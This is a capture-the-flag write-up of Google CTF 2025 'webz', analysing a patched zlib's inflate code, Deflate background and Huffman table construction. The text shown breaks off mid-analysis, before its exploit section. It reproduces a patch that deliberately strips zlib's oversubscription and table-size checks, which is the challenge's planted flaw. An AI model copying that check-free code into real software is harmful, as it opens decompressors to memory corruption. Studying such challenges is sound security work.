<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://velog.io/@0range1337/CTF-Google-CTF-2025-webz-Exploiting-zlibs-Huffman-Code-Table-English">Original</a>
    <h1>Google CTF 2025 – webz : Exploiting zlib&#39;s Huffman Code Table</h1>
    
    <div id="readability-page-1" class="page"><div><div><div><blockquote>
<p>한국어: <a href="https://velog.io/@0range1337/CTF-Google-CTF-2025-webz-Exploiting-zlibs-Huffman-Code-Table">https://velog.io/@0range1337/CTF-Google-CTF-2025-webz-Exploiting-zlibs-Huffman-Code-Table</a></p>
</blockquote>
<pre><code>1. Overview
2. Background
	2-1. google-zlib-Increase-Huffman-Table-Size.patch
	2-2. Deflate Algorithm
		2-2-1. LZ77
		2-2-2. Huffman Coding
3. Code Analysis
	3-1. Inflate
	3-2. Huffman Table
	3-3. Decode
4. Vulnerability
	4-1. Unintialized Huffman Code Table
	4-2. Exploiting inflate_fast
    	4-2-1. Integer Overflow (Unexploitable)
    	4-2-2. PoC
        4-2-3. Stream Overflow (Exploitable)
    	4-2-4. PoC
5. Exploit</code></pre>
<p><img src="https://velog.velcdn.com/images/0range1337/post/d972372c-b201-4d9e-bec4-517991357c24/image.png"/></p>

<hr/>
<p><code>webz</code> is a zlib exploitation challenge from Google CTF 2025. The Google-zlib implementation provided in the challenge is not upstream; it’s a version with an arbitrary patch applied. Whereas typical open‑source exploit challenges ship a patch that clearly introduces a vulnerability, <code>webz</code>’s Google-zlib patch appears—at first glance—to be a normal optimization.</p>
<p>In practice, the vulnerability in this Google-zlib can be found quickly via fuzzing. However, in this write‑up we’ll derive the precise root cause through source analysis.</p>

<hr/>
<p>The Google-zlib codebase isn’t large, but it is quite tricky. Because it implements compression algorithms, manipulates data at the bit level, and contains optimizations that sacrifice readability, analysis can be difficult.</p>
<pre><code><span>// webz.c:L114</span>
    <span>int</span> ret <span>=</span> <span>inflateInit2</span><span>(</span><span>&amp;</span>webz_state<span>.</span>infstream<span>,</span> <span>-</span><span>15</span><span>)</span><span>;</span>
    webz_state<span>.</span>infstream<span>.</span>msg <span>=</span> webz_state<span>.</span>ok_status<span>;</span>

    <span>if</span> <span>(</span>ret <span>!=</span> Z_OK<span>)</span> <span>{</span>
        <span>printf</span><span>(</span><span>&#34;Error: inflateInit failed: %d\n&#34;</span><span>,</span> ret<span>)</span><span>;</span>
        <span>return</span><span>;</span>
    <span>}</span>

    ret <span>=</span> <span>inflate</span><span>(</span><span>&amp;</span>webz_state<span>.</span>infstream<span>,</span> Z_NO_FLUSH<span>)</span><span>;</span>

    <span>if</span> <span>(</span>ret <span>!=</span> Z_STREAM_END<span>)</span> <span>{</span>
        <span>printf</span><span>(</span><span>&#34;Error: inflate failed: %d\n&#34;</span><span>,</span> ret<span>)</span><span>;</span>
        <span>inflateEnd</span><span>(</span><span>&amp;</span>webz_state<span>.</span>infstream<span>)</span><span>;</span>
        <span>return</span><span>;</span>
    <span>}</span>

    <span>inflateEnd</span><span>(</span><span>&amp;</span>webz_state<span>.</span>infstream<span>)</span><span>;</span></code></pre>
<blockquote>
<pre><code><span>// zlib.h\:L570</span>
<span>/</span>\<span>*</span>
windowBits can also be <span>-</span><span>8.</span><span>.</span><span>-</span><span>15</span> <span>for</span> raw deflate<span>.</span>  In this <span>case</span><span>,</span> <span>-</span>windowBits
determines the window size<span>.</span>  <span>deflate</span><span>(</span><span>)</span> will then generate raw deflate data
with no zlib header or trailer<span>,</span> and will not compute a check value<span>.</span>
\<span>*</span><span>/</span></code></pre>
</blockquote>
<p>First, let’s look at the provided <code>webz.c</code>. It’s simply a wrapper around Google-zlib. It receives raw Deflate-compressed data from the user and decompresses it using Google-zlib’s <code>inflate</code>. Therefore, we must identify vulnerabilities in the code that implements <code>inflate</code>: <code>inflate.c</code>, <code>inftrees.c</code>, and <code>inffast.c</code>.</p>
<blockquote>
<ul>
<li>inflate.c</li>
<li>inftrees.c</li>
<li>inffast.c</li>
</ul>
</blockquote>
<h2 id="2-1-google-zlib-increase-huffman-table-sizepatch">2-1. google-zlib-Increase-Huffman-Table-Size.patch</h2>
<pre><code>From <span>2</span>c282408771115b3cf80eeb9572927b796ddea79 Mon Sep <span>17</span> <span>00</span><span>:</span><span>00</span><span>:</span><span>00</span> <span>2001</span>
From<span>:</span> Brendon Tiszka <span>&lt;</span>tiszka@google<span>.</span>com<span>&gt;</span>
Date<span>:</span> Wed<span>,</span> <span>21</span> May <span>2025</span> <span>15</span><span>:</span><span>11</span><span>:</span><span>52</span> <span>+</span><span>0000</span>
Subject<span>:</span> <span>[</span>PATCH<span>]</span> <span>[</span>google<span>-</span>zlib<span>]</span> Increase Huffman Table Size

The basic idea is to use a bigger root <span>&amp;</span> secondary table <span>for</span> both
dists and lens<span>,</span> allowing us to avoid oversubscription chekcs<span>.</span>
<span>--</span><span>-</span>
 inftrees<span>.</span>c <span>|</span> <span>18</span> <span>--</span><span>--</span><span>--</span><span>--</span><span>--</span><span>--</span><span>--</span><span>--</span><span>--</span>
 inftrees<span>.</span>h <span>|</span> <span>18</span> <span>++</span><span>++</span><span>+</span><span>--</span><span>--</span><span>--</span><span>--</span><span>--</span><span>--</span><span>-</span>
 <span>2</span> files changed<span>,</span> <span>5</span> <span>insertions</span><span>(</span><span>+</span><span>)</span><span>,</span> <span>31</span> <span>deletions</span><span>(</span><span>-</span><span>)</span>

diff <span>--</span>git a<span>/</span>inftrees<span>.</span>c b<span>/</span>inftrees<span>.</span>c
index a127e6b<span>.</span><span>.7</span>a8dd2e <span>100644</span>
<span>--</span><span>-</span> a<span>/</span>inftrees<span>.</span>c
<span>++</span><span>+</span> b<span>/</span>inftrees<span>.</span>c
@@ <span>-</span><span>122</span><span>,</span><span>16</span> <span>+</span><span>122</span><span>,</span><span>6</span> @@ <span>int</span> ZLIB_INTERNAL <span>inflate_table</span><span>(</span>codetype type<span>,</span> <span>unsigned</span> <span>short</span> FAR <span>*</span>lens<span>,</span>
         <span>if</span> <span>(</span>count<span>[</span>min<span>]</span> <span>!=</span> <span>0</span><span>)</span> <span>break</span><span>;</span>
     <span>if</span> <span>(</span>root <span>&lt;</span> min<span>)</span> root <span>=</span> min<span>;</span>
 
<span>-</span>    <span>/* check for an over-subscribed or incomplete set of lengths */</span>
<span>-</span>    left <span>=</span> <span>1</span><span>;</span>
<span>-</span>    <span>for</span> <span>(</span>len <span>=</span> <span>1</span><span>;</span> len <span>&lt;=</span> MAXBITS<span>;</span> len<span>++</span><span>)</span> <span>{</span>
<span>-</span>        left <span>&lt;&lt;=</span> <span>1</span><span>;</span>
<span>-</span>        left <span>-=</span> count<span>[</span>len<span>]</span><span>;</span>
<span>-</span>        <span>if</span> <span>(</span>left <span>&lt;</span> <span>0</span><span>)</span> <span>return</span> <span>-</span><span>1</span><span>;</span>        <span>/* over-subscribed */</span>
<span>-</span>    <span>}</span>
<span>-</span>    <span>if</span> <span>(</span>left <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>(</span>type <span>==</span> CODES <span>||</span> max <span>!=</span> <span>1</span><span>)</span><span>)</span>
<span>-</span>        <span>return</span> <span>-</span><span>1</span><span>;</span>                      <span>/* incomplete set */</span>
<span>-</span>
     <span>/* generate offsets into symbol table for each length for sorting */</span>
     offs<span>[</span><span>1</span><span>]</span> <span>=</span> <span>0</span><span>;</span>
     <span>for</span> <span>(</span>len <span>=</span> <span>1</span><span>;</span> len <span>&lt;</span> MAXBITS<span>;</span> len<span>++</span><span>)</span>
@@ <span>-</span><span>200</span><span>,</span><span>11</span> <span>+</span><span>190</span><span>,</span><span>6</span> @@ <span>int</span> ZLIB_INTERNAL <span>inflate_table</span><span>(</span>codetype type<span>,</span> <span>unsigned</span> <span>short</span> FAR <span>*</span>lens<span>,</span>
     used <span>=</span> <span>1U</span> <span>&lt;&lt;</span> root<span>;</span>          <span>/* use root table entries */</span>
     mask <span>=</span> used <span>-</span> <span>1</span><span>;</span>            <span>/* mask for comparing low */</span>
 
<span>-</span>    <span>/* check available table space */</span>
<span>-</span>    <span>if</span> <span>(</span><span>(</span>type <span>==</span> LENS <span>&amp;&amp;</span> used <span>&gt;</span> ENOUGH_LENS<span>)</span> <span>||</span>
<span>-</span>        <span>(</span>type <span>==</span> DISTS <span>&amp;&amp;</span> used <span>&gt;</span> ENOUGH_DISTS<span>)</span><span>)</span>
<span>-</span>        <span>return</span> <span>1</span><span>;</span>
<span>-</span>
     <span>/* process all codes and make table entries */</span>
     <span>for</span> <span>(</span><span>;</span><span>;</span><span>)</span> <span>{</span>
         <span>/* create table entry */</span>
@@ <span>-</span><span>270</span><span>,</span><span>9</span> <span>+</span><span>255</span><span>,</span><span>6</span> @@ <span>int</span> ZLIB_INTERNAL <span>inflate_table</span><span>(</span>codetype type<span>,</span> <span>unsigned</span> <span>short</span> FAR <span>*</span>lens<span>,</span>
 
             <span>/* check for enough space */</span>
             used <span>+=</span> <span>1U</span> <span>&lt;&lt;</span> curr<span>;</span>
<span>-</span>            <span>if</span> <span>(</span><span>(</span>type <span>==</span> LENS <span>&amp;&amp;</span> used <span>&gt;</span> ENOUGH_LENS<span>)</span> <span>||</span>
<span>-</span>                <span>(</span>type <span>==</span> DISTS <span>&amp;&amp;</span> used <span>&gt;</span> ENOUGH_DISTS<span>)</span><span>)</span>
<span>-</span>                <span>return</span> <span>1</span><span>;</span>
 
             <span>/* point entry in root table to sub-table */</span>
             low <span>=</span> huff <span>&amp;</span> mask<span>;</span>
diff <span>--</span>git a<span>/</span>inftrees<span>.</span>h b<span>/</span>inftrees<span>.</span>h
index <span>396f</span><span>74</span>b<span>.</span><span>.42</span>c2c44 <span>100644</span>
<span>--</span><span>-</span> a<span>/</span>inftrees<span>.</span>h
<span>++</span><span>+</span> b<span>/</span>inftrees<span>.</span>h
@@ <span>-</span><span>35</span><span>,</span><span>19</span> <span>+</span><span>35</span><span>,</span><span>11</span> @@ <span>typedef</span> <span>struct</span> <span>{</span>
     <span>01000000</span> <span>-</span> invalid code
  <span>*</span><span>/</span>
 
<span>-</span><span>/* Maximum size of the dynamic table.  The maximum number of code structures is
-   1444, which is the sum of 852 for literal/length codes and 592 for distance
-   codes.  These values were found by exhaustive searches using the program
-   examples/enough.c found in the zlib distribution.  The arguments to that
-   program are the number of symbols, the initial root table size, and the
-   maximum bit length of a code.  &#34;enough 286 9 15&#34; for literal/length codes
-   returns 852, and &#34;enough 30 6 15&#34; for distance codes returns 592. The
-   initial root table size (9 or 6) is found in the fifth argument of the
-   inflate_table() calls in inflate.c and infback.c.  If the root table size is
-   changed, then these maximum sizes would be need to be recalculated and
-   updated. */</span>
<span>-</span>#define ENOUGH_LENS <span>852</span>
<span>-</span>#define ENOUGH_DISTS <span>592</span>
<span>+</span><span>/* Memory/speed tradeoff. Alocate more-than-ENOUGH space for LENS and
+   DISTS so we can remove overflow checks from `inflate`.
+*/</span>
<span>+</span>#define ENOUGH_LENS <span>(</span><span>1</span> <span>&lt;&lt;</span> <span>15</span><span>)</span>
<span>+</span>#define ENOUGH_DISTS <span>(</span><span>1</span> <span>&lt;&lt;</span> <span>15</span><span>)</span>
 <span>#<span>define</span> ENOUGH (ENOUGH_LENS+ENOUGH_DISTS)</span>
 
 <span>/* Type of code to build for inflate_table() */</span>
<span>--</span> 
<span>2.50</span><span>.0</span><span>.</span>rc0<span>.</span><span>642.</span>g800a2b2222<span>-</span>goog
</code></pre>
<p>The Google-zlib source shipped with the challenge contains a <code>0001-google-zlib-Increase-Huffman-Table-Size.patch</code>. From that patch we can see the code has been modified as above.</p>
<p>The patch removes some checks in <code>inftrees.c</code> and greatly increases the values of <code>ENOUGH_LENS</code> and <code>ENOUGH_DISTS</code>. From the comments, the patch increases the sizes of Huffman tables and removes related checks to achieve a memory/speed tradeoff optimization. At this point we don’t yet know exactly what issues this introduces, but it’s clear the vulnerability will be related to Huffman tables and Huffman coding.</p>
<h2 id="2-2-deflate-algorithm">2-2. Deflate Algorithm</h2>
<p>Before analyzing the code, let’s review the Deflate compression algorithm. Deflate uses Huffman coding and the LZ77 algorithm to compress data.</p>
<h3 id="2-2-1-lz77">2-2-1. LZ77</h3>
<p>The principle of the LZ77 algorithm is very simple: repeated data is replaced by (length, distance) pairs.</p>
<pre><code>ABCDEEABCDFF -&gt; ABCDEE(4,6)FF</code></pre>
<p>The length is how many bytes to copy, and the distance is how far back from the current position the source data lies.</p>
<h3 id="2-2-1-huffman-coding">2-2-1. Huffman Coding</h3>
<p>Huffman coding is a bit more involved. The basic idea is to replace original data with compressed bit sequences. While the minimum unit of data is typically a byte (8 bits), replacing values with shorter bit sequences reduces size.</p>
<pre><code>ABABAAAABBBB (12 Byte, 96bit) -&gt; 010100001111 ( 1.5 Byte, 12bit)</code></pre>
<p>In this example there are only two symbols, A and B, which can be encoded with 1-bit Huffman codes (0 and 1). If there are more than two symbols, you obviously cannot compress them all with 1-bit codes.</p>
<pre><code>A -&gt; 00
B -&gt; 01
C -&gt; 10
D -&gt; 110
E -&gt; 111

ABCDABCEABC -&gt; 000110110000110111</code></pre>
<blockquote>
<p>As shown, Huffman codes depend on the data being compressed, so to decode the compressed data, you need a table mapping {Huffman code : actual value}.</p>
</blockquote>
<p>A Huffman code cannot be the prefix of another Huffman code. For example, if 111 is a code, then 11 cannot be a code; since codes have variable length, a prefix collision like 1110 would be ambiguous—unclear whether it’s 111 + 0 or 11 + 10.</p>
<p>Also, the minimum and maximum code lengths vary depending on the number of distinct data values. Huffman coding assigns shorter codes (e.g., 2 bits) to high-frequency values (A, B, C) and longer codes (e.g., 3 bits) to low-frequency values (D, E) to compress effectively.</p>
<p>Additionally, consider this: if Deflate generates efficient Huffman codes tailored to the input, then the decoder needs the corresponding Huffman table to decode. Therefore, Deflate uses either fixed Huffman tables or dynamic Huffman tables depending on the situation.</p>
<blockquote>
<ul>
<li><strong>Fixed Huffman table</strong></li>
<li><strong>Dynamic Huffman table</strong></li>
</ul>
</blockquote>
<p>Let’s elaborate on “including the Huffman table in the final compressed data.” In the standard implementation, the Huffman table can be represented using only code lengths.</p>
<pre><code>A -&gt; 00
B -&gt; 01
C -&gt; 10
D -&gt; 110
E -&gt; 111</code></pre>
<p>Rather than storing the entire codes as above, you can store just the code lengths:</p>
<pre><code>A -&gt; 2
B -&gt; 2
C -&gt; 2
D -&gt; 3
E -&gt; 3</code></pre>
<p>Since actual Huffman codes have lengths in the range 3–15 bits, storing only lengths reduces the size of the embedded Huffman tables.</p>
<blockquote>
<p>Separately from using code lengths to compress the Huffman table, Google‑zlib compresses the lengths themselves again using Huffman coding. We’ll discuss this in more detail during the source analysis below.</p>
</blockquote>
<pre><code>huffman_table[&#39;A&#39;] = 2
huffman_table[&#39;B&#39;] = 2
huffman_table[&#39;C&#39;] = 2
huffman_table[&#39;D&#39;] = 3
huffman_table[&#39;E&#39;] = 3</code></pre>
<p>This works for a simple reason. A Huffman table is an array indexed by the original symbol. Assign the first 2-bit code 00 to A; then B gets 01, C gets 10, and so on. Using only lengths and order, all codes are recoverable. In other words, if Deflate assigns codes in order, Inflate can reconstruct them from just the lengths.</p>
<blockquote>
<p>Deflate uses Huffman coding not only for literal values (0–255), but also for the LZ77 (length, distance) pairs.</p>
</blockquote>

<hr/>
<h2 id="3-1-inflate">3-1. Inflate</h2>
<pre><code><span>int</span> ZEXPORT <span>inflate</span><span>(</span>z_streamp strm<span>,</span> <span>int</span> flush<span>)</span> <span>{</span>
    <span>struct</span> <span>inflate_state</span> FAR <span>*</span>state<span>;</span>
    z_const <span>unsigned</span> <span>char</span> FAR <span>*</span>next<span>;</span>    <span>/* next input */</span>
    <span>unsigned</span> <span>char</span> FAR <span>*</span>put<span>;</span>     <span>/* next output */</span>
    <span>unsigned</span> have<span>,</span> left<span>;</span>        <span>/* available input and output */</span>
    <span>unsigned</span> <span>long</span> hold<span>;</span>         <span>/* bit buffer */</span>
    <span>unsigned</span> bits<span>;</span>              <span>/* bits in bit buffer */</span>
    <span>unsigned</span> in<span>,</span> out<span>;</span>           <span>/* save starting available input and output */</span>
    <span>unsigned</span> copy<span>;</span>              <span>/* number of stored or match bytes to copy */</span>
    <span>unsigned</span> <span>char</span> FAR <span>*</span>from<span>;</span>    <span>/* where to copy match bytes from */</span>
    code here<span>;</span>                  <span>/* current decoding table entry */</span>
    code last<span>;</span>                  <span>/* parent table entry */</span>
    <span>unsigned</span> len<span>;</span>               <span>/* length to copy for repeats, bits to drop */</span>
    <span>int</span> ret<span>;</span>                    <span>/* return code */</span>
<span>#<span>ifdef</span> GUNZIP</span>
    <span>unsigned</span> <span>char</span> hbuf<span>[</span><span>4</span><span>]</span><span>;</span>      <span>/* buffer for gzip header crc calculation */</span>
<span>#<span>endif</span></span>
    <span>static</span> <span>const</span> <span>unsigned</span> <span>short</span> order<span>[</span><span>19</span><span>]</span> <span>=</span> <span>/* permutation of code lengths */</span>
        <span>{</span><span>16</span><span>,</span> <span>17</span><span>,</span> <span>18</span><span>,</span> <span>0</span><span>,</span> <span>8</span><span>,</span> <span>7</span><span>,</span> <span>9</span><span>,</span> <span>6</span><span>,</span> <span>10</span><span>,</span> <span>5</span><span>,</span> <span>11</span><span>,</span> <span>4</span><span>,</span> <span>12</span><span>,</span> <span>3</span><span>,</span> <span>13</span><span>,</span> <span>2</span><span>,</span> <span>14</span><span>,</span> <span>1</span><span>,</span> <span>15</span><span>}</span><span>;</span>

    <span>if</span> <span>(</span><span>inflateStateCheck</span><span>(</span>strm<span>)</span> <span>||</span> strm<span>-&gt;</span>next_out <span>==</span> Z_NULL <span>||</span>
        <span>(</span>strm<span>-&gt;</span>next_in <span>==</span> Z_NULL <span>&amp;&amp;</span> strm<span>-&gt;</span>avail_in <span>!=</span> <span>0</span><span>)</span><span>)</span>
        <span>return</span> Z_STREAM_ERROR<span>;</span>

    state <span>=</span> <span>(</span><span>struct</span> <span>inflate_state</span> FAR <span>*</span><span>)</span>strm<span>-&gt;</span>state<span>;</span>
    <span>if</span> <span>(</span>state<span>-&gt;</span>mode <span>==</span> TYPE<span>)</span> state<span>-&gt;</span>mode <span>=</span> TYPEDO<span>;</span>      <span>/* skip check */</span>
    <span>LOAD</span><span>(</span><span>)</span><span>;</span>
    in <span>=</span> have<span>;</span>
    out <span>=</span> left<span>;</span>
    ret <span>=</span> Z_OK<span>;</span>
    <span>for</span> <span>(</span><span>;</span><span>;</span><span>)</span>
        <span>switch</span> <span>(</span>state<span>-&gt;</span>mode<span>)</span> <span>{</span>
        <span>case</span> HEAD<span>:</span>
            <span>if</span> <span>(</span>state<span>-&gt;</span>wrap <span>==</span> <span>0</span><span>)</span> <span>{</span>
                state<span>-&gt;</span>mode <span>=</span> TYPEDO<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
            <span>.</span><span>.</span><span>.</span></code></pre>
<p><code>inflate</code> is a virtual finite-state machine. It treats the compressed data stream (<code>strm</code>) as opcodes and executes like a VM. Since <code>inflateInit2_</code> sets <code>state-&gt;mode = HEAD</code>, it transitions to <code>state-&gt;mode = TYPEDO</code>, and then hits the <code>case TYPEDO</code>.</p>
<pre><code><span>/* Load registers with state in inflate() for speed */</span>
<span>#<span>define</span> LOAD() \
    do { \
        put = strm-&gt;next_out; \
        left = strm-&gt;avail_out; \
        next = strm-&gt;next_in; \
        have = strm-&gt;avail_in; \
        hold = state-&gt;hold; \
        bits = state-&gt;bits; \
    } while (0)</span>

<span>/* Restore state from registers in inflate() */</span>
<span>#<span>define</span> RESTORE() \
    do { \
        strm-&gt;next_out = put; \
        strm-&gt;avail_out = left; \
        strm-&gt;next_in = next; \
        strm-&gt;avail_in = have; \
        state-&gt;hold = hold; \
        state-&gt;bits = bits; \
    } while (0)</span></code></pre>
<blockquote>
<ul>
<li><code>strm-&gt;next_out</code>: end pointer of the decompressed output buffer that’s been filled so far</li>
<li><code>strm-&gt;avail_out</code>: remaining size of the decompression buffer</li>
<li><code>strm-&gt;next_in</code>: end pointer of the processed input data</li>
<li><code>strm-&gt;avail_in</code>: remaining number of input bytes to process</li>
<li><code>state-&gt;hold</code>: buffer used for bit operations</li>
<li><code>state-&gt;bits</code>: current bit length stored in <code>state-&gt;hold</code></li>
</ul>
</blockquote>
<p>Before the main loop, let’s note some macros and variables used by Inflate. Members of the <code>strm</code> structure don’t benefit from register optimization, so these macros copy them into locals for faster operations.</p>
<pre><code><span>/* Get a byte of input into the bit accumulator, or return from inflate()
   if there is no input available. */</span>
<span>#<span>define</span> PULLBYTE() \
    do { \
        if (have == 0) goto inf_leave; \
        have--; \
        hold += (unsigned long)(*next++) &lt;&lt; bits; \
        bits += 8; \
    } while (0)</span>

<span>/* Assure that there are at least n bits in the bit accumulator.  If there is
   not enough available input to do that, then return from inflate(). */</span>
<span>#<span>define</span> NEEDBITS(n) \
    do { \
        while (bits &lt; (unsigned)(n)) \
            PULLBYTE(); \
    } while (0)</span>

<span>/* Return the low n bits of the bit accumulator (n &lt; 16) */</span>
<span>#<span>define</span> BITS(n) \
    ((unsigned)hold &amp; ((1U &lt;&lt; (n)) - 1))</span>

<span>/* Remove n bits from the bit accumulator */</span>
<span>#<span>define</span> DROPBITS(n) \
    do { \
        hold &gt;&gt;= (n); \
        bits -= (unsigned)(n); \
    } while (0)</span></code></pre>
<p>Unlike byte-oriented data, compressed data is processed at bit granularity because of packing and Huffman coding. The Inflate implementation uses macros like these to fill a bit buffer (<code>hold</code>) and manipulate it bitwise.</p>
<p>The basic logic is: use <code>NEEDBITS</code> to pull bits from <code>strm-&gt;next_in</code> (<code>next</code>) into <code>state-&gt;hold</code> (<code>hold</code>), decreasing <code>strm-&gt;avail_in</code> (<code>have</code>) accordingly. Then extract as many bits as needed with <code>BITS</code>, and drop consumed bits with <code>DROPBITS</code>.</p>
<p>Using this bit-level handling, the code decodes the compressed data and appends the decoded bytes to <code>strm-&gt;next_out</code> (<code>put</code>), decreasing <code>strm-&gt;avail_out</code> (<code>left</code>) by the number of bytes written.</p>
<pre><code>        <span>case</span> TYPEDO<span>:</span>
            <span>if</span> <span>(</span>state<span>-&gt;</span>last<span>)</span> <span>{</span>
                <span>BYTEBITS</span><span>(</span><span>)</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> CHECK<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
            <span>NEEDBITS</span><span>(</span><span>3</span><span>)</span><span>;</span>
            state<span>-&gt;</span>last <span>=</span> <span>BITS</span><span>(</span><span>1</span><span>)</span><span>;</span>
            <span>DROPBITS</span><span>(</span><span>1</span><span>)</span><span>;</span>
            <span>switch</span> <span>(</span><span>BITS</span><span>(</span><span>2</span><span>)</span><span>)</span> <span>{</span>
            <span>case</span> <span>0</span><span>:</span>                             <span>/* stored block */</span>
                <span>Tracev</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:     stored block%s\n&#34;</span><span>,</span>
                        state<span>-&gt;</span>last <span>?</span> <span>&#34; (last)&#34;</span> <span>:</span> <span>&#34;&#34;</span><span>)</span><span>)</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> STORED<span>;</span>
                <span>break</span><span>;</span>
            <span>case</span> <span>1</span><span>:</span>                             <span>/* fixed block */</span>
                <span>fixedtables</span><span>(</span>state<span>)</span><span>;</span>
                <span>Tracev</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:     fixed codes block%s\n&#34;</span><span>,</span>
                        state<span>-&gt;</span>last <span>?</span> <span>&#34; (last)&#34;</span> <span>:</span> <span>&#34;&#34;</span><span>)</span><span>)</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> LEN_<span>;</span>             <span>/* decode codes */</span>
                <span>if</span> <span>(</span>flush <span>==</span> Z_TREES<span>)</span> <span>{</span>
                    <span>DROPBITS</span><span>(</span><span>2</span><span>)</span><span>;</span>
                    <span>goto</span> inf_leave<span>;</span>
                <span>}</span>
                <span>break</span><span>;</span>
            <span>case</span> <span>2</span><span>:</span>                             <span>/* dynamic block */</span>
                <span>Tracev</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:     dynamic codes block%s\n&#34;</span><span>,</span>
                        state<span>-&gt;</span>last <span>?</span> <span>&#34; (last)&#34;</span> <span>:</span> <span>&#34;&#34;</span><span>)</span><span>)</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> TABLE<span>;</span>
                <span>break</span><span>;</span>
            <span>case</span> <span>3</span><span>:</span>
                strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid block type&#34;</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
            <span>}</span>
            <span>DROPBITS</span><span>(</span><span>2</span><span>)</span><span>;</span>
            <span>break</span><span>;</span></code></pre>
<p>Back in <code>inflate</code>, compressed data is processed in blocks, starting at <code>case TYPEDO</code>. After ensuring at least 3 bits in the buffer (<code>NEEDBITS(3)</code>), it reads 1 bit with <code>BITS(1)</code> to set <code>state-&gt;last</code>, which indicates whether this block is the last one. It then drops that bit and uses the next two bits to select the block type.</p>
<blockquote>
<ul>
<li><strong><em>stored block (0)</em></strong>: a block of uncompressed data. When <code>state-&gt;mode = STORED</code>, it will directly copy from <code>strm-&gt;next_in</code> to <code>strm-&gt;next_out</code>.</li>
<li><strong><em>fixed codes block (1)</em></strong>: data compressed with the fixed Huffman table. <code>fixedtables(state)</code> builds the fixed table, then <code>state-&gt;mode = LEN_</code> moves to the Huffman decoding path.</li>
<li><strong><em>dynamic codes block (2)</em></strong>: data compressed with a dynamic Huffman table. <code>state-&gt;mode = TABLE</code> reads dynamic table info from the compressed stream, constructs the dynamic Huffman table, then proceeds to decode.</li>
</ul>
</blockquote>
<p>Blocks have the following forms:</p>
<pre><code>[0(stored_bock) + state-&gt;last + length to copy + uncompressed bytes to copy]
[1(fixed codes block) + state-&gt;last + compressed data (Huffman codes) + Huffman code for End of Block]
[2(Dynamic codes block) + state-&gt;last + dynamic table info (Code Huffman table + compressed Literal/Length and Distance Huffman tables) + compressed data (Huffman codes) + Huffman code for End of Block ]</code></pre>
<p>The compressed stream consists of one or more blocks, and <code>inflate</code> decodes each according to the code above.</p>
<pre><code>        <span>case</span> TABLE<span>:</span>
            <span>NEEDBITS</span><span>(</span><span>14</span><span>)</span><span>;</span>
            state<span>-&gt;</span>nlen <span>=</span> <span>BITS</span><span>(</span><span>5</span><span>)</span> <span>+</span> <span>257</span><span>;</span>
            <span>DROPBITS</span><span>(</span><span>5</span><span>)</span><span>;</span>
            state<span>-&gt;</span>ndist <span>=</span> <span>BITS</span><span>(</span><span>5</span><span>)</span> <span>+</span> <span>1</span><span>;</span>
            <span>DROPBITS</span><span>(</span><span>5</span><span>)</span><span>;</span>
            state<span>-&gt;</span>ncode <span>=</span> <span>BITS</span><span>(</span><span>4</span><span>)</span> <span>+</span> <span>4</span><span>;</span>
            <span>DROPBITS</span><span>(</span><span>4</span><span>)</span><span>;</span>
<span>#<span>ifndef</span> PKZIP_BUG_WORKAROUND</span>
            <span>if</span> <span>(</span>state<span>-&gt;</span>nlen <span>&gt;</span> <span>286</span> <span>||</span> state<span>-&gt;</span>ndist <span>&gt;</span> <span>30</span><span>)</span> <span>{</span>
                strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;too many length or distance symbols&#34;</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
<span>#<span>endif</span></span>
            <span>Tracev</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:       table sizes ok\n&#34;</span><span>)</span><span>)</span><span>;</span>
            state<span>-&gt;</span>have <span>=</span> <span>0</span><span>;</span>
            state<span>-&gt;</span>mode <span>=</span> LENLENS<span>;</span>
                <span>/* fallthrough */</span></code></pre>
<p>Let’s look at how a dynamic Huffman table is built. As noted earlier, a dynamic codes block includes a Code Huffman table, and compressed Literal/Length and Distance tables. The code above reads the lengths for those three tables.</p>
<p>The Literal/Length table contains codes for literal bytes (A, B, …) and for LZ77 lengths; the Distance table holds codes for LZ77 distances. Using these two tables, the decoder performs Huffman and LZ77 decoding. So what is the Code Huffman table? The Literal/Length and Distance tables are stored <em>compressed</em> in the stream—again via Huffman coding. The Code Huffman table is the dynamic Huffman table used to <em>decode the Huffman tables</em> (lengths) themselves.</p>
<pre><code>        <span>case</span> LENLENS<span>:</span>
            <span>while</span> <span>(</span>state<span>-&gt;</span>have <span>&lt;</span> state<span>-&gt;</span>ncode<span>)</span> <span>{</span>
                <span>NEEDBITS</span><span>(</span><span>3</span><span>)</span><span>;</span>
                state<span>-&gt;</span>lens<span>[</span>order<span>[</span>state<span>-&gt;</span>have<span>++</span><span>]</span><span>]</span> <span>=</span> <span>(</span><span>unsigned</span> <span>short</span><span>)</span><span>BITS</span><span>(</span><span>3</span><span>)</span><span>;</span>
                <span>DROPBITS</span><span>(</span><span>3</span><span>)</span><span>;</span>
            <span>}</span>
            <span>while</span> <span>(</span>state<span>-&gt;</span>have <span>&lt;</span> <span>19</span><span>)</span>
                state<span>-&gt;</span>lens<span>[</span>order<span>[</span>state<span>-&gt;</span>have<span>++</span><span>]</span><span>]</span> <span>=</span> <span>0</span><span>;</span>
            state<span>-&gt;</span>next <span>=</span> state<span>-&gt;</span>codes<span>;</span>
